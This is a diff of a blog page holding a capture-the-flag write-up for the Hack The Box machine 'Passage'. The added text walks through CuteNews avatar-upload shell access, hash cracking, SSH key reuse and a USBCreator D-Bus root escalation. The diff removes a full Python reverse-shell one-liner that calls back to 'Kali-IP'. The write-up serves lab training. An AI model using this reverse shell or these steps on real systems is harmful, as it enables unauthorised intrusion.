@@ -33,10 +33,46 @@
         <h2>BLOG</h2>
         <p>Passage Hack The Box Write Up</p>
       </div>
-          <img src="passage_images/passage.webp" alt="passage hack the box" class="center">
-          <!-- Highligh in C# mode -->
-<pre><code class="lang-python">python -c 'import pty;import socket,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("Kali-IP",443));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/bash")'
-</code></pre>
+          <img src="passage_images/infocard.png" height="60%" width="60%" alt="passage hack the box" class="center">
+          <div class="write-up-section">
+            <h2>TL;DR</h2>
+            <p class="paragraph">In this box, I did not spend too much time looking for a foothold, since we could not make directory searches through wfuzz plus nmap scan only showed 2 opened ports, port 22 (SSH) and port 80 (HTTP). Therefore, once I worked out what I had to do, the box was both fun and interesting.</p>
+            <h2>part one: scan and dir search</h2>
+            <p class="paragraph">First of all, I started by using Nmap Scan:</p>
+            <img src="passage_images/nmapScan.png" height="70%" width="70%" alt="nmap scan" class="center">
+            <p class="mini-desc">nmap scan</p>
+            <p class="paragraph">Looking up the website, we find an article that the website implemented fail2ban (it blocks an ip when many requets are made to the server). So fuzzing was not the way.</p>
+            <p class="paragraph">I found that the website was using <a href="https://cutephp.com/">CuteNews</a> as CMS. Typing cutenews will take us to the Login-Register page.</p> 
+            <img src="passage_images/cutenews.png" height="50%" width="50%" alt="cutenews screenshot" class="center">
+            <p class="mini-desc">cuteNews CMS</p>
+            <h2>part two: get low privileged reverse shell</h2>
+            <p class="paragraph">I registered a random username and accessed the CMS. At first sight, there is a config page where we can change our avatar. Perfect time to upload a reverse shell encoded in an image :).</p>
+            <img src="passage_images/changeAvatar.png" height="60%" width="70%" alt="Cutenews change avatar" class="center">
+            <p class="mini-desc">Change Avatar Screen</p>
+            <img src="passage_images/exiftool.png" height="50%" width="50%" alt="exiftool" class="center">
+            <p class="mini-desc">reverse shell inside our image</p>
+            <p class="paragraph">Images are renamed but going to uploads folder will take us where images are uplaoded. From now, we can make a reverse call to get a shell in our system.</p>
+            <img src="passage_images/wwwdatashell.png" height="50%" width="50%" alt="reverse shell as www-data" class="center">
+            <p class="mini-desc">www-data reverse shell</p>
+            <h2>part three: Privilege escalation to user</h2>
+            <p class="paragraph">Doing some enumeration inside cdata/users/ folder will take us to get some base64 encoded text. There are several of them, but as we know the only users inside the machine are paul and nadav (altough we can only get user paul hash), we will look for these ones.</p>
+            <p class="paragraph">Apparently we get is a SHA256 hash, checking it in <a href="https://crackstation.net/">CrackStation</a> will give us the password for user Paul.</p>
+            <img src="passage_images/crackstation.png" height="75%" width="75%" alt="crackstation" class="center">
+            <p class="mini-desc">crackstation.net</p>
+            <p class="paragraph">Now, we are Paul.</p>
+            <img src="passage_images/userflag.png" height="50%" width="50%" alt="user flag passage" class="center">
+            <p class="mini-desc">user.txt</p>
+            <h2>part four: Privilege escalation to root</h2>
+            <p class="paragraph">Nadav is another user inside the machine, inside paul home folder I did not find anything except its ssh key. It took me a while to realize I could ssh nadav using the same ssh key (unexpected).</p>
+            <img src="passage_images/sshnadav.png" height="50%" width="50%" alt="ssh" class="center">
+            <p class="mini-desc">becoming nadav</p>
+            <p class="paragraph">Looking up inside the machine, I found so far a .viminfo file. The file said the machine was using dbus and USBCreator interface. Looking up a vulnerability I found this article: <a href="https://unit42.paloaltonetworks.com/usbcreator-d-bus-privilege-escalation-in-ubuntu-desktop/">USBCreator Privilege Escalation in Ubuntu</a>. This vulnerability allow users within suoder group to bypass the password security policy imposed by the sudo program by overwriting arbitrary files with arbitrary content as root. Perfect, as long as root has SSH access, right? That is exactly what a tried, and I got successful</p>
+            <img src="passage_images/rootflag.png" height="95%" width="95%" alt="root flag passage htb" class="center">
+            <p class="mini-desc">root.txt</p>
+            <p class="paragraph">Congratulations we have owned PASSAGE! </p>
+            <p class="paragraph">Hope you have had fun rooting this box! <i class="ri-emotion-laugh-line"></i></p>
+          </div>
+          </div>
     </div>
   
   <script src="assets/vendor/jquery/jquery.min.js"></script>
